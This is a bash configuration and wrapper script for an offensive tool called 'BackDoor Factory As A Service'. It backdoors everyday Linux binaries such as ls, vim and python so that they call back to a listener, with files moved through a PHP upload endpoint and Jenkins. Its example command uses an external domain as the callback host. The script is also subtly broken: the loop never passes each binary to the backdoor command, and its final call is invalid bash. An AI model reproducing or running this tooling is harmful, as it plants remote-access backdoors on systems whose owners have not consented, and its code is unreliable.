### BackDoor Factory As A Serive Settings (BDFAAS) ###
##Example for abd.py command
##python abd.py /home/shadghost/tools/Auto-Backdoor/ls mail.riverservice.website put.php mail.riverservice.website:8080 auth auto_mail 0 0 8888 mail.riverservice.website


## EDIT STARTING HERE ##
#Enable ABD wiht 1
ABD_E=1 ##Not needed in wrapper, this is ment for a diffrent script

#ABD location
ABD_LOC="abd.py"

#What to backdoor note:/bin/bash fails, don't know why
array=("ls" "dir" "pwd" "nano" "vi" "vim" "gedit" "python")  ##recomended ones, too many may make it bad

#Jenkins
J_URL="127.0.0.1:8080"
J_PROJECT="TestProj"
J_TOKEN="foo"

#PUT LOC
P_URL="127.0.0.1"
P_LOC="put.php"

#Listner
L_IP="127.0.0.1"
L_PORT="8888"
## DON'T EDIT BELOW HERE ##
### ABD SubCommand

abd() {
	###python abd.py $BINARY $PLACE TO UPLOAD / DOWNLOAD $PUT SCRIPT LOCATION $JENKINS URL $Jenkins token $Jenkins project location $0 for linux $not used yet, always 0 $Backdoor callback port $backdoor callback ip / domain name
	echo "Array items:"
	for item in ${array[*]}
	do
		printf "   %s\nBackdooring: " `which $item`
		python $ABD_LOC $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_IP $L_PORT
	done
}

abd()

##HAVE FUN##
